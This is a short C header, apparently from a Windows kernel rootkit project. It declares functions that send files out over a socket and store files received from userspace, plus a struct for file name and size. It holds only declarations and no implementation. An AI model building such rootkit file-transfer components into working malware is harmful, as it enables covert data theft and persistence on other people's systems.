#pragma once

NTSTATUS rk_send_file_to_userspace(IN PCHAR FileName, IN PFILE_OBJECT SocketObject, IN PROOTKIT_API_HASH Hash);

NTSTATUS rk_store_file_from_userspace(IN PFILE_OBJECT SocketObject, IN PROOTKIT_API_HASH Hash);


typedef struct _ROOTKIT_STORE_USERSPACE_FILE
{
	CHAR FileName[255];
	ULONG FileSize;

}ROOTKIT_STORE_USERSPACE_FILE, *PROOTKIT_STORE_USERSPACE_FILE;